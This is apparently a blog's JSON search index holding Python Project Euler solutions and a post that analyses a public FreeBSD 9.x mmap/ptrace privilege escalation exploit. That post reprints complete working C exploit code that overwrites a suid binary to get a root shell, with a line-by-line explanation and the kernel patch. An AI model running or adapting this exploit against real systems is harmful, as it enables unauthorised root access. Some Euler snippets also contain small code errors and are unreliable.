&gt;&gt;&gt; prime_factorization(100) [2, 2, 5, 5]   Of course, 100 can be factored into non-prime numbers like 4, 10, 20, 25, 50. But as I have explained in (1), all these non-prime numbers can be divided into prime number factors.      4 = 2 * 2     10 = 2 * 5     20 = 2 * 2 * 5    And so on. The fact that the program starts with smallest prime numbers (2, 3, 5, 7…) prevents non-prime factors.   Lastly, note that it’s x &lt;= n  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-prime-factor/",
        "teaser":null},{
        "title": "Largest Palindrome Product",
        "excerpt":"   A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91*99.     Find the largest palindrome made from the product of two 3-digit numbers.    4th question from Project Euler. Finiding the largest palindromic number that is a product of two 3-digit numbers.   The game plan is to get all the product of 3-digit numbers, find which ones are palindromic, and then print the largest one.   It is clear that the range of 3-digit number is 100 to 999.   itertools.product is used to generate pairs of 3-digit numbers.   from itertools import product product(xrange(100, 999), repeat=2)   It is a short and clean substitute for nested loops.   product(A, B) #equivalent to ((x, y) for x in A for y in B)  product(A, repeat=2) #equivalent to product(A, A)   For details, refer to Python Docs   Finding if a given number is palindromic can be done by converting it into a string and compare it with its reverse copy.   x = 110011 print str(x) == str(x)[::-1] #True   Now we only need to put the results in a list and print the largest one using max().   from itertools import product results = [ a*b for a,b in product(xrange(100,999), repeat=2) \\             if str(a*b) == str(a*b)[::-1] ] print max(results) #906609   So the answer is 906609.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-palindrome-product/",
        "teaser":null},{
        "title": "Smallest Multiple",
        "excerpt":"   2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.     What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?    Fifth question from Project Euler.   Given that 2520 is evenly divisible by numbers from 1 to 10, which means it is always true that   2520 % x = 0 (0&lt;x&lt;11)   Now 2520 is called the Least Common Multiple (LCM) of X = [1, 2, ..., 10]   The most straight forward method to find the LCM for 1 to 20 is to use a loop and check on every stepping to see if the next number can be divided by 1 to 20. But this will probably take too long (The answer is more than 100 million)   We can try to reduce the size of the set X to speed up the process. 1 for instance, can be removed from the list since all positive whole numbers are divisible by 1. Furthermore, if a number is divisible by 20, then it should be divisible by 2, 4, 5, and 10. We’ll end up with a list looks like   X = [11,13,14,16,17,18,19,20]   Now since it is always true that   (x1 * x2 * x3 * ... * xn) % x1 = 0   So that if we were to multiply all the numbers in X, we get 3724680960 which is divisible by every number in X. We can say that 3724680960 is a common multiple, but it is unlikely the least common multiple.   The LCM can be calculated by dividing 3724680960 by the Greatest Common Divisor (GCD) of X.   For instance,   Y = [6, 9] #Then we have multiple = 6 * 9 = 54 #And GCD(Y) = 3 #Since 54 = 6 * 9 = 3 * 2 * 3 * 3 #Then LCM(Y) = multiple / GCD(Y) = 3 * 2 * 3 * 3 / 3 = 18   Euclidean Algorithm can be used to calculate GCD of two integers very fast.   def gcd(a, b):     while b:         a, b = b, a % b     return a   For instance, gcd(6, 9) will have                  a       b       result                       6       9                         9       6 (6 % 9)                         6       3 (9 % 6)                         3       0 (6 % 3)       3 (b = 0)           And since we have   GCD(a, b, c) = GCD(a, GCD(b, c)) = GCD(GCD(a, b), c) = GCD(GCD(a, c), b)   We can apply gcd and lcm functions to a list of numbers by using reduce   def _sum(a, b):     return a + b  Y = [6, 9, 11] reduce(_sum, Y) #Is equivalent to _sum(_sum(6, 9), 11)  Now putting all together, we have   def gcd(a, b):     while b:         a, b = b, a % b     return a  def lcm(a, b):     return a * b / gcd(a, b)  x = [11,13,14,16,17,18,19,20] print reduce(lcm, x) #232792560 print reduce(xrange(1, 21) #232792560   Either way, the answer is 232792560.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/smallest-multiple/",
        "teaser":null},{
        "title": "Sum Square Difference",
        "excerpt":"   The difference between the sum of the squares of the first ten natural numbers and the square of the sum is 3025 385 = 2640. Find the difference between the sum of the squares of the first one hundred natural numbers and the square of the sum.    Sixth question from Project Euler.   Sum Square Difference (SSD) is commonly used in image processing. For the sum of squares of the first 100 natural numbers,   sumsqr = (1 ** 2 + 2 ** 2 + ... 100 **2)   And for the square of the sum,   sqrsum = (1 + 2 + ... + 100) ** 2   A simple loop will do the job.   sumsqr, sqrsum = 0  for i in ((x, x ** 2) for x in xrange(1, 101)):     sqrsum += i[0]     sumsqr += i[1]  print sqrsum ** 2 - sumsqr #25164150   The answer is 25164150.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/sum-square-difference/",
        "teaser":null},{
        "title": "FreeBSD mmap+ptrace Privilege Escalation Exploit Analysis",
        "excerpt":"   Happy Birthday FreeBSD! Now you are 20 years old and your security is the same as 20 years ago… :) – Hunger hunger@hunger.hu    Saw this little birthday gift this morning from Full Disclosure. Works on my FreeBSD VM. Here’s a screenshot.      And here’s the exploit code   /*  * FreeBSD 9.{0,1} mmap/ptrace exploit  * by Hunger &lt;fbsd9lul@hunger.hu&gt;  *  * Happy Birthday FreeBSD!  * Now you are 20 years old and your security is the same as 20 years ago...  *  * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,  *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:  *                      I hope we'll meet again at 8@1470n  *  * Special thanks to proactivesec.com  *  */  #include &lt;err.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/ptrace.h&gt; #include &lt;sys/wait.h&gt;  #define SH \"/bin/sh\" #define TG \"/usr/sbin/timedc\"  int main(int ac, char **av) {    int from_fd, to_fd, status;    struct stat st;    struct ptrace_io_desc piod;    char *s, *d;    pid_t pid;     if (geteuid() == 0)  {         setuid(0);         execl(SH, SH, NULL);         return 0;    }     printf(\"FreeBSD 9.{0,1} mmap/ptrace exploit\\n\");    printf(\"by Hunger &lt;fbsd9lul@hunger.hu&gt;\\n\");     if ((from_fd = open(av[0], O_RDONLY)) == -1 ||         (to_fd = open(TG, O_RDONLY)) == -1)                 err(1, \"open\");     if (stat(av[0], &amp;st) == -1)         err(2, \"stat\");     if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,         MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||                 (d = mmap(NULL, (size_t)st.st_size, PROT_READ,                         MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)                                 err(3, \"mmap\");     if ((pid = fork()) == -1)         err(4, \"fork\");     if (!pid) {         if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)                 err(5, \"ptraceme\");          return 0;         }     if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)         err(6, \"ptattach\");     if (wait(&amp;status) == -1)         err(7, \"wait\");     piod.piod_op = PIOD_WRITE_D;    piod.piod_offs = d;    piod.piod_addr = s;    piod.piod_len  = st.st_size;     if (ptrace(PT_IO, pid, (caddr_t)&amp;piod, 0) == -1)         err(8, \"ptio\");     execl(TG, TG, NULL);     return 0; }   I later found out that this vulnerability is already announced on 18-June-2013 and a patch was released with the Security Advisory   As stated in the Security Advisory, mmap is a POSIX-compliant system call that allows users to map files into memory by a process, and then can be accessed using memory operations.   And the ptrace is a handy tracing and debugging facility that allows users to attach to and control the traced process.   A security vulnerability exists in the virtual memory system that the permission checks are insufficient which allows the tracing process to modify adresses to which the traced process itself does not have write access.   The Analysis   The exploit code is quite simple, but it took me sometime to understand how mmap(2) and ptrace(2) works under FreeBSD.   if (geteuid() == 0)  {      setuid(0);      execl(SH, SH, NULL);      return 0; }   At the begining of the exploit, it checks if the effective user id is 0. This will only be true when the suid bit is set for the executable. Of course it’s not true at this point, because the exploit binary doesn’t have suid set.   However, this code will eventually get injected into another executable program, which obviously should have the suid bit, so that we can then setuid to 0, and get our lovely shell with root privilege.   #define TG \"/usr/sbin/timedc\"  $ ls -l /usr/sbin/timedc -r-sr-xr-x  1 root  wheel  20688 Dec  4  2012 /usr/sbin/timedc   As you can see here, timedc is chosen for us to inject to. Note that it has suid bit.   So now what’s left is to just inject this code into timedc, and when it gets called, we get a shell.   if ((from_fd = open(av[0], O_RDONLY)) == -1 ||      (to_fd = open(TG, O_RDONLY)) == -1)              err(1, \"open\"); if (stat(av[0], &amp;st) == -1)        err(2, \"stat\");   Now it tries to open the compiled binary of itself (av[0]) as from_fd, and /usr/sbin/timedc as to_fd. And then the stat of the exploit binary is saved in a stat struct called st. It’ll later be used to get the size of the exploit binary.   if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,      MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||              (d = mmap(NULL, (size_t)st.st_size, PROT_READ,                      MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)                              err(3, \"mmap\");   mmap is used then to map the exploit binary into memory as s and timedc as d.   Refer to mmap man pages for details.   if ((pid = fork()) == -1)      err(4, \"fork\");  if (!pid) {      if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)              err(5, \"ptraceme\");       return 0;      }  if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)      err(6, \"ptattach\");  if (wait(&amp;status) == -1)      err(7, \"wait\");   Next it forks a child process. fork returns 0 to the child process, and the child process id to the parent process.   Since !pid is true only for the child process, PT_TRACE_ME marks the child as the traced process, This is for the kernel to know that some other process is tracing this child.   PT_ATTACH is executed by the parent process, it attaches to the child to start controlling it. Now we have two processes of the exploit, one tracing process, and one traced process.   Finally with wait, it suspends the calling process until status is available for terminated child process, or a signal is received from kernel. Since PT_TRACE_ME is set for the child process, a signal from kernel is expected. That’ll explicitly tell us that we are now okay to start tracing.   piod.piod_op = PIOD_WRITE_D; piod.piod_offs = d; piod.piod_addr = s; piod.piod_len  = st.st_size;  if (ptrace(PT_IO, pid, (caddr_t)&amp;piod, 0) == -1)      err(8, \"ptio\");   piod is a ptrace_io_desc struct, it’ll be used by PT_IO   The PT_IO request allows reading and writing arbitrary amounts of data in the traced process’s address space. In this case the addr argument should be a pointer to a ptrace_io_desc which is defined as   struct ptrace_io_desc {         int     piod_op;        /* I/O operation */         void    *piod_offs;     /* child offset */         void    *piod_addr;     /* parent offset */         size_t  piod_len;       /* request length */ };   This is designed for us to write data to the child process, but instead this piece of code writes the exploit binary to timedc.   This is the exact point of the vulnerability, the parent tracing process controls the child traced process to write data to timedc, which it originally has no privilege to do so. The virtual memory system does not check if such write/read operation is allowed. The injection of the exploit code into timedc is finished.   execl(TG, TG, NULL);   Now it runs timedc. Since it has the exploit code injected, and it has suid set, we can now get a shell with root privilege.   The Solution   A patch is provided by the Security Advisory. You can follow the instruction there to patch your system.   --- sys/vm/vm_map.c     (revision 251636) +++ sys/vm/vm_map.c     (working copy) @@ -3761,6 +3761,12 @@ RetryLookup:;                 vm_map_unlock_read(map);                 return (KERN_PROTECTION_FAILURE);         } +       if ((fault_typea &amp; VM_PROT_COPY) != 0 &amp;&amp; +           (entry-&gt;max_protection &amp; VM_PROT_WRITE) == 0 &amp;&amp; +           (entry-&gt;eflags &amp; MAP_ENTRY_COW) == 0) { +               vm_map_unlock_read(map); +               return (KERN_PROTECTION_FAILURE); +       }   The patch adds security checking upon virtual memory copying.   Nice birthday gift Hunger, had some very fun reading and debugging.  ","categories": [],
        "tags": ["FreeBSD","Security","C++"],
        "url": "http://localhost:4000/freebsd-mmap-ptrace-privilege-escalation-exploit-analysis/",
        "teaser":null},{
        "title": "10001st Prime Number",
        "excerpt":"   By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13. What is the 10001st prime number?    This is the seventh question from Project Euler. Getting the 10001st prime number.   Well, the most staright forward method to solve this is to iterate through all nummbers greater than 2 and check their primality one by one until we reach the 10001st prime.   To check a number’s primality, we can simply try to divide the number by every number less than it. With the computational power that everyone has nowadays, even a simple solution as such can effectively give an answer within seconds or even fractions of seconds. But what if we need the 10000001st prime number?   As the counter grows, it is awkward to stick with a brute-force algorithm. We need to optimize it, and make it variable for reasonable large numbers.   A simple optimization is that, if a number can be divided by an even number, it is not a prime number, and it can be divided by 2. For instance,   12 / 4 = 3  and  12 / 2 = 6 Since 12 = 2 * 2 * 3   As shown above, when testing a number’s primality, we don’t need to divide the number by even numbers that are less than it, we only need to test odd numbers. For instance,   13 % 2 != 0 13 % 3 != 0 13 % 5 != 0 13 % 7 != 0 13 % 9 != 0 13 % 11 != 0  # Thus, 13 is a prime number   Any number that can be divided by an even number can also be divided by 2, it’ll fail the first checking so we don’t have to worry about even numbers at all.   Since we cut off all the even number checkings except for 2, it is nearly half of the original cost.   Yet we can further improve this simple primality checking algorithm.   # Since for any number, we have x = a * b  If a &gt; sqrt(x) and b &gt; sqrt(x) then a * b &gt; x  # Thus, only one of a, b can be greater than sqrt(x)   This means when checking a numbers primality, not all the odd numbers less than it need to be checked, only for those that are also less than the square root of the number. For insance,   sqrt(13) = 3.60 13 % 2 != 0 13 % 3 ! = 0  # Thus, 13 is a prime number   Looks like we just effectively reduced the cost by half again. To implement this idea to get the 10001st prime number,   import math def isPrime(num):     if num == 2:         return True     if num % 2 == 0 or num &lt; 2:         return False     #Start from 3, until its square root, with stepping 2     for x in xrange(3, int(math.sqrt(num)) + 1, 2):         if num % x == 0:             return False     return True  if __name__ == '__main__':     num = counter = 1     while (counter &lt; 10001):         num += 2 #Only test odd numbers         if isPrime(num):             counter += 1     print \"The 10001st prime number is: \" + str(num)   Note that,   for x in xrange(3, int(math.sqrt(num)) + 1, 2):  # Is equivalent to  for (int x = 3; x &lt;= sqrt(num); x += 2)  # In some other programming languages.   The answer is 104743.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/10001st-prime-number/",
        "teaser":null},{
        "title": "Largest Product In A Series",
        "excerpt":"   Find the greatest product of five consecutive digits in the 1000-digit number.    x = \"\"\"73167176531330624919225119674426574742355349194934 96983520312774506326239578318016984801869478851843 85861560789112949495459501737958331952853208805511 12540698747158523863050715693290963295227443043557 66896648950445244523161731856403098711121722383113 62229893423380308135336276614282806444486645238749 30358907296290491560440772390713810515859307960866 70172427121883998797908792274921901699720888093776 65727333001053367881220235421809751254540594752243 52584907711670556013604839586446706324415722155397 53697817977846174064955149290862569321978468622482 83972241375657056057490261407972968652414535100474 82166370484403199890008895243450658541227588666881 16427171479924442928230863465674813919123162824586 17866458359124566529476545682848912883142607690042 24219022671055626321111109370544217506941658960408 07198403850962455444362981230987879927244284909188 84580156166097919133875499200524063689912560717606 05886116467109405077541002256983155200055935729725 71636269561882670428252483600823257530420752963450 \"\"\" x = x.replace('\\n', '')   This is the 8th question from Project Euler. Given a 1000-digit number, we need to get the maximum product of 5 consecutive digits.   By five consecutive digits, it means the (7, 3, 1, 6, 7), (3, 1, 6, 7, 1), …. The game plan is to write a simple loop, walk through this 1000-digit number and see which 5 yeilds the greatest product.   Note that the last group of 5 consecutive digits is (6, 3, 4, 5, 0) which starts at the index len(x) - 4   x = \"\"\"73167176531330624919225119674426574742355349194934 96983520312774506326239578318016984801869478851843 85861560789112949495459501737958331952853208805511 12540698747158523863050715693290963295227443043557 66896648950445244523161731856403098711121722383113 62229893423380308135336276614282806444486645238749 30358907296290491560440772390713810515859307960866 70172427121883998797908792274921901699720888093776 65727333001053367881220235421809751254540594752243 52584907711670556013604839586446706324415722155397 53697817977846174064955149290862569321978468622482 83972241375657056057490261407972968652414535100474 82166370484403199890008895243450658541227588666881 16427171479924442928230863465674813919123162824586 17866458359124566529476545682848912883142607690042 24219022671055626321111109370544217506941658960408 07198403850962455444362981230987879927244284909188 84580156166097919133875499200524063689912560717606 05886116467109405077541002256983155200055935729725 71636269561882670428252483600823257530420752963450 \"\"\" x = x.replace('\\n', '')  if __name__ == '__main__':     max_product = -1     for i in range(len(x) - 4):         product = int(x[i]) * int(x[i+1]) * int(x[i+2]) * \\                 int(x[i+3]) * int(x[i+4])         if product &gt; max_product:             max_product = product     print max_product   Very straight-forward code. Taken from pastebin and modified a little bit. Of course there are simpler and more pythonic ways, but since this is a simple question, I’ll just be lazy and ignore the possible ugliness of this code.   The answer is 40824, if you print out the five digits, they are, (9, 9, 8, 7, 9), starting at index 364.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-product-in-a-series/",
        "teaser":null},{
        "title": "What is wrong with microservice",
        "excerpt":"Welcome   Hello world, this is my first Jekyll blog post.   I hope you like it!  ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/what-is-wrong-with-microservice/",
        "teaser":null}]
